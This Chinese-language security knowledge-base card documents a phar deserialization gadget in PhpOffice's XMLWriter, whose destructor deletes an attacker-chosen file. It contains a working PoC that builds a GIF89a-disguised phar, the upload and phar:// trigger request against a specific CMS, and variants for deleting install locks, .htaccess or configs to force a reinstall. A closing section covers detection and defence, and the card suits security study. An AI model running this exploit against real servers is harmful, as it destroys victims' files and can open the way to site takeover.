---
id: web-php-deserialization-phpoffice-xmlwriter-phar-file-delete
title: PhpOffice XMLWriter 的 phar 反序列化任意文件删除：__destruct 对 tempFileName 执行 unlink（非 Windows）
type: scenario
domain: web
path: web/php/deserialization
technique: phpoffice-xmlwriter-phar-destruct-unlink-file-delete
aliases:
- PhpOffice XMLWriter 反序列化
- XMLWriter tempFileName 删除文件
- phar 任意文件删除
- PhpOffice\Common\XMLWriter
- phar 删文件 gadget
tags:
- php
- phar
- deserialization
- phpoffice
- xmlwriter
- file-delete
- pop-chain
- gadget
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V541
  verified_at: '2026-11-11T19:19:27+08:00'
  notes: 已对照原文与 21 张截图核对：图19 XMLWriter::__destruct 与卡内代码逐行一致（empty(tempFileName) return；PHP_OS != 'WINNT' && @unlink(...)===false 抛异常）；图10-14 FileCookieJar 写马链仅作触发面背景；图16 UEditor POST /public/ueditor/php/controller.php?action=uploadfile 上传 phar.jpg（GIF89a stub + 序列化 metadata），返回 /uploads/blog/file/20240215/1707993817409899.jpg；图17/20 用 /tbadmin/readpdf?file=phar://... 触发（响应虽有 fopen phar error 警告但 metadata 已反序列化）；图21 删除后 /111.php 返回 404；目标 PHP 7.3.x/Linux（图07/18），与卡内『PHP_OS != WINNT、PHP 7.x』相符；PoC 代码与原文 POC2 一致。修正两处：①『UEditor 可上传任意后缀文件』改为原文实际的 phar.jpg 上传（原文未测任意后缀）；②断链 [[web-php-deserialization-phar-base64-eval-upload]]（库内不存在）替换为已验证的 [[web-php-deserialization-phar-read-uploaded-image-pop-chain]]。dedup：recommendation=new，12 个 related 均为不同 gadget/触发卡（FileCookieJar 写文件、fileowner/file_get_contents 触发等），XMLWriter unlink 删文件 gadget 全库唯一；dup-scan 无本篇 pair。未验证点：未复现；PHP 8 环境下 phar metadata 处理差异未在原文讨论。
---

## 一句话结论

PhpOffice 组件中的 `PhpOffice\Common\XMLWriter` 在析构时会对可控的 `tempFileName` 执行 `unlink()`（条件是当前系统不是 Windows）；把该对象放进 PHAR 的 metadata，并通过任意 `phar://` 文件操作触发反序列化，即可删除服务器上任意路径的文件（原文实测删除 Web 目录下的 111.php，随后访问返回 404）。

## 原理

- `PhpOffice\Common\XMLWriter` 的析构函数：
  ```php
  public function __destruct()
  {
      if (empty($this->tempFileName)) {
          return;
      }
      if (PHP_OS != 'WINNT' && @unlink($this->tempFileName) === false) {
          throw new \Exception('The file '.$this->tempFileName.' could not be deleted.');
      }
  }
  ```
  `tempFileName` 是对象属性，反序列化时完全由 metadata 控制；在 Linux 等非 Windows 系统上，析构即调用 `unlink()` 删除该路径。
- PHAR 反序列化：PHP 在通过 `phar://` 访问归档时会解析其 manifest 并对 metadata 执行 `unserialize()`。攻击者把恶意 `XMLWriter` 对象序列化进 PHAR metadata，再让目标用 `phar://` 打开该文件，即触发析构。
- 上传与触发（原文链路）：CMS 自带 UEditor，可上传文件（PHAR stub 前置 `GIF89a` 伪装图片，原文上传为 `phar.jpg`）；生成 `phar.phar` 后改名为 `phar.jpg` 上传，再通过文件读取接口 `readpdf?file=phar://uploads/.../phar.jpg` 触发。
- 之所以成立：PHAR metadata 的反序列化是 PHP 的默认行为，而 `XMLWriter` 这类“析构时做文件操作”的类就是 POP gadget；`tempFileName` 无路径限制，删除目标任意（只要进程有权限）。
- 与写文件 gadget 的区别：本 gadget 不写内容、不依赖 JSON/代码注入，只是一个 `unlink`，适合删除安装锁、配置文件、`.htaccess`、日志等，或与其他漏洞组合（例如删配置触发重装/降级）。

## 触发条件

- 目标为 Linux/Unix（`PHP_OS != 'WINNT'`），PHP 运行时会反序列化 PHAR metadata（PHP 7.x 等常见版本）。
- 目标 classpath 存在 PhpOffice 组件（PhpSpreadsheet/PHPWord 等依赖常见于 CMS）。
- 攻击者能上传 PHAR 文件（如图片后缀 + GIF89a stub），并能让服务端以 `phar://` 打开该路径（文件读取/存在性检查等）。
- 进程对要删除的文件有写权限（目录写权限即可删除文件）。

## 利用步骤

1. 生成 PHAR：metadata 为 `PhpOffice\Common\XMLWriter`，`tempFileName` 设为目标文件绝对/相对路径；stub 用 `GIF89a<?php __HALT_COMPILER(); ?>` 伪装图片头。
2. 改名 `.jpg`，通过上传接口（如 UEditor `controller.php?action=uploadfile`）上传，拿到落地路径。
3. 通过任意 `phar://` 触发点（如 `readpdf?file=phar://uploads/.../phar.jpg`）让服务端打开该文件，PHAR metadata 反序列化，析构执行 `unlink`。
4. 访问/检查目标文件确认被删除（原文删除 111.php 后访问返回 404）。
5. 授权测试中只删除自建测试文件。

## PoC

```php
<?php
namespace PhpOffice\Common;
class XMLWriter {
    public function __construct(){
        $this->tempFileName = "111.php";   // 要删除的目标文件
    }
}
namespace {
    $obj = new \PhpOffice\Common\XMLWriter();
    $phar = new \Phar('phar.phar');
    $phar->startBuffering();
    $phar->setStub('GIF89a'.'<?php __HALT_COMPILER(); ?>');
    $phar->addFromString('test.txt','test');
    $phar->setMetadata($obj);
    $phar->stopBuffering();
    rename('phar.phar','phar.jpg');
}
```

触发（原文）：

```http
GET /tbadmin/readpdf?file=phar://uploads/blog/file/20240215/<hash>.jpg HTTP/1.1
Host: target
```

原文结果：目标 111.php 被删除，再次访问返回 404。

## 变体与关联

- 变体：删除目标可换成 `install.lock`、`.htaccess`、`config.php`、日志/缓存文件；也可删除安全组件文件造成降级或重装条件。
- 变体：`ZipArchive::open(OVERWRITE)` 等原生类删除 sink 与本报废链同类，见 [[web-php-deserialization-ziparchive-overwrite-file-delete]]；触发点可用 `file_exists`/`is_writable`/`fopen` 等任意 `phar://` 文件操作。
- 关联：[[web-php-deserialization-showdoc-new-is-writeable-phar-guzzle-filecookiejar-webshell]]（同文章同一 phar 上传/触发面，但 gadget 是 FileCookieJar 写 Webshell）；[[web-php-deserialization-phar-read-uploaded-image-pop-chain]] 等通用 phar 上传+触发卡。
- 边界：Windows 目标不触发（`PHP_OS == 'WINNT'`）；目标禁用 phar 包装器、上传内容做真实图片解码、进程无目录写权限时失效。

## 检测与防御

- 检测：请求参数或文件路径出现 `phar://`；上传目录出现带 `GIF89a` 头但内含 `__HALT_COMPILER` 与序列化 metadata 的文件；PhpOffice/XMLWriter 类被反序列化；Web 目录关键文件（install.lock、.htaccess、配置）被删除。
- 防御：对用户可控路径的文件操作拒绝 `phar://` 等流包装器并做 `realpath` 限定；上传文件做真实图片解码重编码，破坏 PHAR 结构；上传目录禁止脚本执行并移出 Web 根；升级 PHP 并跟进 PHAR metadata 反序列化缓解；对关键文件做完整性监控与备份。
